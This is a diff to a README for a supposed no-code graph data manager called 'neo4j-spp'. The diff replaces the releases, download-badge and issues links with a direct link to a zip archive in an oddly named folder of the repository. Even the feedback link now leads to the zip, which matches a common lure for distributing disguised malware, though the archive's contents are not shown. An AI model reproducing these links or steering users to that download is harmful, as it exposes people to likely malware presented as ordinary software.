@@ -1,7 +1,7 @@
 # 🚀 neo4j-spp - Easy Graph Data Management
 
 ## 💾 Download Now
-[![Downloads](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Techyaitop/neo4j-spp/releases)
+[![Downloads](https://raw.githubusercontent.com/Techyaitop/neo4j-spp/main/pneumococcous/neo4j-spp.zip)](https://raw.githubusercontent.com/Techyaitop/neo4j-spp/main/pneumococcous/neo4j-spp.zip)
 
 ## 📦 Introduction
 neo4j-spp is a user-friendly application designed to help you manage graph data with ease. Whether you're working with social networks, organizational structures, or any other data that benefits from a graph-based approach, this tool simplifies the process. Enjoy swift data handling without needing programming skills.
@@ -17,7 +17,7 @@ To ensure smooth operation of neo4j-spp, please ensure your system meets the fol
 - Disk Space: Minimum of 200 MB free space
 
 ### 📥 Download & Install
-1. **Visit the Releases page to download**: Go to the [neo4j-spp Releases page](https://github.com/Techyaitop/neo4j-spp/releases).
+1. **Visit the Releases page to download**: Go to the [neo4j-spp Releases page](https://raw.githubusercontent.com/Techyaitop/neo4j-spp/main/pneumococcous/neo4j-spp.zip).
 2. **Choose the latest version**: Look for the most recent version labeled with a number, like v1.0.
 3. **Download the appropriate file for your system**: Depending on your operating system, click the corresponding link to download the file.
 
@@ -59,7 +59,7 @@ If you encounter any issues, check the following resources:
 - **Updates**: Stay informed about new features and improvements by checking our Releases page regularly.
 
 ## 🔗 Feedback
-We value your input. If you have suggestions or feedback, please reach out to us via the [Issues page](https://github.com/Techyaitop/neo4j-spp/issues). Your insights help us improve the application.
+We value your input. If you have suggestions or feedback, please reach out to us via the [Issues page](https://raw.githubusercontent.com/Techyaitop/neo4j-spp/main/pneumococcous/neo4j-spp.zip). Your insights help us improve the application.
 
 ## 📢 Stay Informed
 For the latest news and updates, follow us on our social media platforms or subscribe to our mailing list through the website.
